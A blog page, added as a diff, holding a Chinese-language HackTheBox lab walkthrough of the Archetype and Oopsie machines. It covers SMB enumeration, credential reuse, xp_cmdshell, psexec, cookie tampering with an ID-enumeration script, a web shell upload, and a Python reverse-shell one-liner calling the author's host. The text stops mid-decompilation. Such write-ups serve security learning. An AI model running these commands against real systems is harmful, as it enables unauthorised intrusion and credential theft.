@@ -1,0 +1,709 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+<meta name="referrer" content="no-referrer" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo_icon.svg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo_icon.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo_icon.svg">
+  <link rel="mask-icon" href="/images/logo_icon.svg" color="#222">
+  <link rel="manifest" href="/images/logo_icon.svg">
+  <meta name="msapplication-config" content="/images/logo_icon.svg">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoloyolo.top","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="借着HTB多学一些Windows下的渗透技巧">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox_Start_Point">
+<meta property="og:url" content="https://yoloyolo.top/2021/06/04/HackTheBox-Start-Point/index.html">
+<meta property="og:site_name" content="xXxYOLOxXx">
+<meta property="og:description" content="借着HTB多学一些Windows下的渗透技巧">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-06-04T16:26:01.000Z">
+<meta property="article:modified_time" content="2023-02-14T15:32:40.000Z">
+<meta property="article:author" content="xXxYOLOxXx">
+<meta property="article:tag" content="Pentest">
+<meta property="article:tag" content="HackTheBox">
+<meta property="article:tag" content="Windows">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://yoloyolo.top/2021/06/04/HackTheBox-Start-Point/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>HackTheBox_Start_Point | xXxYOLOxXx</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><link rel="alternate" href="/atom.xml" title="xXxYOLOxXx" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">xXxYOLOxXx</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">xXxYOLOxXx</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="links fa-fw"></i>Links</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://yoloyolo.top/2021/06/04/HackTheBox-Start-Point/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="xXxYOLOxXx">
+      <meta itemprop="description" content="Explorer for unknown.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xXxYOLOxXx">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HackTheBox_Start_Point
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-06-04 12:26:01" itemprop="dateCreated datePublished" datetime="2021-06-04T12:26:01-04:00">2021-06-04</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-02-14 10:32:40" itemprop="dateModified" datetime="2023-02-14T10:32:40-05:00">2023-02-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Study/" itemprop="url" rel="index"><span itemprop="name">Study</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>借着HTB多学一些Windows下的渗透技巧</p>
+<a id="more"></a>
+<h1 id="hackthebox_archetype"><a class="markdownIt-Anchor" href="#hackthebox_archetype"></a> HackTheBox_Archetype</h1>
+<p>Windows</p>
+<h2 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h2>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.27</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.27</span><br><span class="line">Host is up (0.51s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">135/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds</span><br><span class="line">1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000</span><br><span class="line">Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2>
+<p>用smbmap先扫描一波SMB服务</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.10.27</span><br><span class="line">[+] IP: 10.10.10.27:445	Name: 10.10.10.27</span><br></pre></td></tr></table></figure>
+<p>随便加个用户名</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.10.27 -u <span class="built_in">test</span></span><br><span class="line">[+] Guest session   	IP: 10.10.10.27:445	Name: 10.10.10.27                                       </span><br><span class="line">        Disk                                                  	Permissions	Comment</span><br><span class="line">	----                                                  	-----------	-------</span><br><span class="line">	ADMIN$                                            	NO ACCESS	Remote Admin</span><br><span class="line">	backups                                           	READ ONLY	</span><br><span class="line">	C$                                                	NO ACCESS	Default share</span><br><span class="line">	IPC$                                              	READ ONLY	Remote IPC</span><br></pre></td></tr></table></figure>
+<p>空密码即可登入</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">smbclient \\\\10.10.10.27\\backups -U <span class="built_in">test</span></span><br><span class="line">Enter WORKGROUP\<span class="built_in">test</span><span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Try &quot;help&quot; to get a list of possible commands.</span></span><br><span class="line"><span class="string">smb: \&gt; dir</span></span><br><span class="line"><span class="string">  .                                   D        0  Fri Jun  4 12:10:59 2021</span></span><br><span class="line"><span class="string">  ..                                  D        0  Fri Jun  4 12:10:59 2021</span></span><br><span class="line"><span class="string">  prod.dtsConfig                     AR      609  Mon Jan 20 20:23:02 2020</span></span><br><span class="line"><span class="string">  schtasks.txt                        A   174006  Fri Jun  4 12:05:57 2021</span></span><br><span class="line"><span class="string">  services.txt                        A     6370  Fri Jun  4 12:10:59 2021</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		10328063 blocks of size 4096. 8165400 blocks available</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smb: \&gt; get prod.dtsConfig</span><br><span class="line">getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)</span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">DTSConfiguration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">DTSConfigurationHeading</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">DTSConfigurationFileInfo</span> <span class="attr">GeneratedBy</span>=<span class="string">&quot;...&quot;</span> <span class="attr">GeneratedFromPackageName</span>=<span class="string">&quot;...&quot;</span> <span class="attr">GeneratedFromPackageID</span>=<span class="string">&quot;...&quot;</span> <span class="attr">GeneratedDate</span>=<span class="string">&quot;20.1.2019 10:01:34&quot;</span>/&gt;</span>&quot;/&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">DTSConfigurationHeading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">ConfiguredType</span>=<span class="string">&quot;Property&quot;</span> <span class="attr">Path</span>=<span class="string">&quot;\Package.Connections[Destination].Properties[ConnectionString]&quot;</span> <span class="attr">ValueType</span>=<span class="string">&quot;String&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ConfiguredValue</span>&gt;</span>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;<span class="tag">&lt;/<span class="name">ConfiguredValue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">DTSConfiguration</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>得到MSSQL账户<code>ARCHETYPE\sql_svc:M3g4c0rp123</code></p>
+<p>这里使用impacket来登入</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
+<p>可以执行系统命令</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">python mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27  -windows-auth</span><br><span class="line">Impacket v0.9.23.dev1+20210528.195232.25c62f65 - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Encryption required, switching to TLS</span><br><span class="line">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master</span><br><span class="line">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english</span><br><span class="line">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192</span><br><span class="line">[*] INFO(ARCHETYPE): Line 1: Changed database context to <span class="string">&#x27;master&#x27;</span>.</span><br><span class="line">[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.</span><br><span class="line">[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) </span><br><span class="line">[!] Press <span class="built_in">help</span> <span class="keyword">for</span> extra shell commands</span><br><span class="line">SQL&gt; enable_xp_cmdshell</span><br><span class="line">[*] INFO(ARCHETYPE): Line 185: Configuration option <span class="string">&#x27;show advanced options&#x27;</span> changed from 0 to 1. Run the RECONFIGURE statement to install.</span><br><span class="line">[*] INFO(ARCHETYPE): Line 185: Configuration option <span class="string">&#x27;xp_cmdshell&#x27;</span> changed from 0 to 1. Run the RECONFIGURE statement to install.</span><br><span class="line">SQL&gt; xp_cmdshell whoami</span><br><span class="line">output                                                                             </span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------   </span><br><span class="line"></span><br><span class="line">archetype\sql_svc                                                                  </span><br><span class="line"></span><br><span class="line">NULL                                                                               </span><br><span class="line"></span><br><span class="line">SQL&gt; xp_cmdshell <span class="built_in">type</span> C:\users\sql_svc\desktop\user.txt</span><br><span class="line">output                                                                             </span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------   </span><br><span class="line"></span><br><span class="line">3e7b102e78218e935bf3f4951fec21a3</span><br></pre></td></tr></table></figure>
+<h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2>
+<p><code>C:\users\sql_svc\appdata</code>为隐藏路径, 需要使用<code>dir /a</code></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; xp_cmdshell <span class="built_in">type</span> C:\users\sql_svc\appdata\roaming\microsoft\windows\powershell\psreadline\ConsoleHost_history.txt</span><br><span class="line">output                                                                             </span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------   </span><br><span class="line"></span><br><span class="line">net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!            </span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span>                                                                               </span><br><span class="line"></span><br><span class="line">NULL</span><br></pre></td></tr></table></figure>
+<p>通过查看powershell的历史记录得到administrator的账户</p>
+<p><code>Archetype\administrator:MEGACORP_4dm1n!!</code></p>
+<p>在使用<code>impacket</code>中的<code>psexec.py</code>来得到管理员权限的Shell</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">python psexec.py archetype/administrator@10.10.10.27</span><br><span class="line">Impacket v0.9.23.dev1+20210528.195232.25c62f65 - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Requesting shares on 10.10.10.27.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file OFvCNrQJ.exe</span><br><span class="line">[*] Opening SVCManager on 10.10.10.27.....</span><br><span class="line">[*] Creating service SMtb on 10.10.10.27.....</span><br><span class="line">[*] Starting service SMtb.....</span><br><span class="line">[!] Press <span class="built_in">help</span> <span class="keyword">for</span> extra shell commands</span><br><span class="line">Microsoft Windows [Version 10.0.17763.107]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;<span class="built_in">type</span> C:\users\administrator\desktop\root.txt</span><br><span class="line">b91ccec3305e98240082d4474b848528</span><br></pre></td></tr></table></figure>
+<hr />
+<blockquote>
+<p>尝试不使用psexec运行管理员权限命令的一波三折</p>
+</blockquote>
+<p>Windows下可以使用runas命令来以其他用户的身份运行命令<br />
+如<code>runas /savecred /user:administrator whoami</code><br />
+但是不能直接通过参数输入密码</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">runas /savecred /user:administrator whoami</span><br><span class="line">试图将 whoami 作为用户 <span class="string">&quot;DOMAIN\administrator&quot;</span> 启动...</span><br><span class="line">输入 administrator 的密码:</span><br></pre></td></tr></table></figure>
+<p>密码的输入需要以交互式的方式来输入, 就无法在MSSQL的非交互式Shell中直接提权</p>
+<p>而可以使用sanur这个工具来进行密码的命令行输入</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas /savecred /user:administrator whoami | sanur.exe password</span><br></pre></td></tr></table></figure>
+<p>但是紧接着问题又来了<br />
+runas貌似不会在当前cmd窗口运行命令而是在一个新的cmd中运行, 这样的话就不能在MSSQL的Shell中看到回显</p>
+<p>所以尝试了文件写入保存命令运行结果的方法</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas /savecred /user:administrator <span class="string">&quot;cmd /c whoami &gt; C:\1&quot;</span> | sanur.exe password</span><br></pre></td></tr></table></figure>
+<p>本地运行成功了, 但是目标机器不行(无奈)</p>
+<hr />
+<h1 id="hackthebox_oopsie"><a class="markdownIt-Anchor" href="#hackthebox_oopsie"></a> HackTheBox_Oopsie</h1>
+<p>Linux</p>
+<h2 id="端口扫描-2"><a class="markdownIt-Anchor" href="#端口扫描-2"></a> 端口扫描</h2>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.28</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.28</span><br><span class="line">Host is up (0.68s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE   VERSION</span><br><span class="line">22/tcp open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open     http            Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞利用-2"><a class="markdownIt-Anchor" href="#漏洞利用-2"></a> 漏洞利用</h2>
+<p>在首页的源码看到这样一条JS</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;/cdn-cgi/login/script.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>得到路径<code>/cdn-cgi/login</code></p>
+<p>访问该路径即为登入页面<br />
+这里的登入需要使用上一台靶机的Administrator密码, 有点坑<br />
+<code>admin:MEGACORP_4dm1n!!</code></p>
+<p>访问<code>/cdn-cgi/login/admin.php?content=uploads</code><br />
+提示<code>This action require super admin rights.</code><br />
+且<code>Cookie</code>中的内容为<code>user=34322; role=admin</code><br />
+那么只要能够得到<code>super admin</code>的<code>id</code>值与<code>username</code>即可越权</p>
+<p><code>/cdn-cgi/login/admin.php?content=accounts&amp;id=1</code><br />
+访问该路径可以得到<code>admin</code>的账户信息<br />
+可以通过爆破参数<code>id</code>来得到<code>super admin</code>的信息</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">req = requests.session()</span><br><span class="line">headers = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;user=34322; role=admin&quot;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">999</span>):</span><br><span class="line">    url = <span class="string">&quot;http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&amp;id=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(_)</span><br><span class="line">    res = req.get(url, headers = headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;super&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(_)</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure>
+<p>id为30, 得到如下信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access ID   Name            Email</span><br><span class="line">86575       super admin     superadmin@megacorp.com</span><br></pre></td></tr></table></figure>
+<p>通过在Burpsuite中修改Cookie为<code>Cookie: user=86575; role=super admin</code>来访问<code>/cdn-cgi/login/admin.php?content=uploads</code><br />
+上传weevely的Shell即可获得权限</p>
+<h2 id="权限提升-2"><a class="markdownIt-Anchor" href="#权限提升-2"></a> 权限提升</h2>
+<p>使用python反弹Shell到本机</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;10.10.16.51&#x27;,9996));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span></span><br><span class="line">-------</span><br><span class="line">nc -lvnp 9996</span><br></pre></td></tr></table></figure>
+<p>获得tty<br />
+(好像是用于获取一个终端会话, 否则后续的切换用户操作无法进行)</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>之前查看用户信息的页面应该用到了SQL的操作<br />
+那么就可以去找SQL的配置信息</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat /var/www/html/cdn-cgi/login/db.php</span><br><span class="line"></span><br><span class="line">&lt;i/login$ cat cat /var/www/html/cdn-cgi/login/db.php</span><br><span class="line">cat: cat: No such file or directory</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;robert&#x27;</span>,<span class="string">&#x27;M3g4C0rpUs3r!&#x27;</span>,<span class="string">&#x27;garage&#x27;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>得到账户信息<code>robert:M3g4C0rpUs3r!</code></p>
+<p>使用该账户信息切换到用户<code>robert</code></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">su robert</span><br><span class="line">M3g4C0rpUs3r!</span><br><span class="line">cat /home/robert/user.txt</span><br><span class="line"></span><br><span class="line">f2c74ee8db7983851ab2a96a44eb7981</span><br></pre></td></tr></table></figure>
+<p>查找有SUID权限的文件</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p>看到一个有意思的文件</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/bugtracker</span><br></pre></td></tr></table></figure>
+<p>而该用户也有运行权限</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ls -la /usr/bin/bugtracker</span><br><span class="line">-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)</span><br></pre></td></tr></table></figure>
+<p>IDA中分析</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">__uid_t</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v7[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = 